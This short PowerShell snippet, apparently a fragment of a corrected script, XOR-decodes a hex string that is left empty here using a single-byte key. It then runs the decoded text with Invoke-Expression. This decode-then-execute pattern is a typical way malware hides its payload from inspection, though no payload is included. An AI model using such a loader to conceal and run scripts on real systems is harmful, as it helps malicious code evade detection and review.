
$RawData = ""
# 2. Corrected Key for XOR (Assuming 556 was truncated to 44 or 0x2C during encryption)
# If your encryption truly used a multi-byte key, this will not work.
# For single-byte XOR, the key MUST be <= 255.
$Key = 0x2C # This is 44 in decimal, which is 556 % 256.

# 3. Process the string and decrypt
$Bytes = $RawData.Split('-') | ForEach-Object { [Convert]::ToByte($_, 16) -bxor $Key }
$DecryptedScript = [System.Text.Encoding]::ASCII.GetString($Bytes)

# 4. Execute
Invoke-Expression $DecryptedScript
